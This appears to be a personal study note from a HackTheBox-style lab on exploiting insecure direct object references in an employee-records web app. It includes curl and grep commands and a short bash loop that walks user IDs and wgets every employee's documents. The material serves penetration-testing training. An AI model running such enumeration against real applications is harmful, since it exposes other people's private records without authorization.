---
title: c-Mass IDOR Enumeration
draft: false
tags:
  - idor
---
Let's start discussing various techniques of exploiting IDOR vulnerabilities, from basic enumeration to mass data gathering, to user privilege escalation.

## Insecure Parameters

> **Employee Manager** web application that hosts employee records.

Let's say we are logged in as an employee with user id `uid=1`.

Once we click on `Documents`, we are directed to `/documents.php?uid=1`.

`Documents` page shows uploaded files from our user:

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

Files above seems to be using the user `uid` and the month/year as part of the file name, which may allow us to fuzz files for other users.

This is one of the most basic type of IDOR - **Static File IDOR**

Also, if the web app doesn't have proper access control system, we will be able to view other employee's document by simply changing `uid` value to something else. 

## Mass Enumeration

We can use tools like `Burp Suite` or `ZAP` to retrieve all the files or write a small bash script to download all files.

Let'stake a view at the HTML source code:

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line, as follows:

```shell-session
jadu101@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

Let's use `Regex` with `grep` to only get the documents links:

```shell-session
jadu101@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

Now, we can use a simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

When we run the script, it will download all documents from all employees with `uids` between 1-10.

